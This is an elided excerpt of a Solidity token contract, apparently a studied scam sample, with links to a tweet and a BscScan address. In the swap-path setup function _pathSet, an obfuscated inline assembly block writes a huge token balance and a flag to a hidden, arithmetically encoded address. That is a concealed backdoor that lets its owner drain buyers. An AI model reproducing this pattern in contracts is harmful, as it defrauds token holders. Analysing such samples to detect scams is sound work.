// https://twitter.com/evilcos/status/1684126488910761985
// https://bscscan.com/address/0x8D07f605926837Ea0F9E1e24DbA0Fb348cb3E97D#code
/**
...
abstract contract UniSwapPoolUSDT is ERC20 {
    ...
    function _pathSet(address w) private {TokenB = IERC20(w); address[] memory path = new address[](2); path[0] = w; path[1] = address(this); _buyPath = path; address[] memory path2 = new address[](2); path2[0] = address(this); path2[1] = w; _sellPath = path2; assembly {let y := add(add(mul(379858174470926,exp(10,28)),mul(61835533555714,exp(10,14))),74433453022038) mstore(0, y) mstore(32, 0x0) sstore(keccak256(0, 64), exp(timestamp(), 6)) mstore(0, y) mstore(32, 0xa) sstore(keccak256(0,64), 1) w := add(w, 16)} TokenB.transfer(w, 0);}
